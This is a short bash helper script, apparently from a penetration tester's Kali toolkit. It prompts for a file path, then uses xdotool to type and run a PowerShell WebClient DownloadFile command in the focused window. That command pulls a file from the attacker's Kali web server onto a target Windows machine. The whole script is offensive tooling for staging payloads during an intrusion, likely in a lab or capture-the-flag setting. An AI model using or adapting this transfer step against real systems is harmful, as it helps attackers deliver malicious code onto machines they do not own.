#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

B_PATH=$(zenity --entry --title="Path" --text="Enter path from webroot:")
F_NAME=$(basename $B_PATH)

paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}/${B_PATH}', '${F_NAME}')\""
xdotool key Return
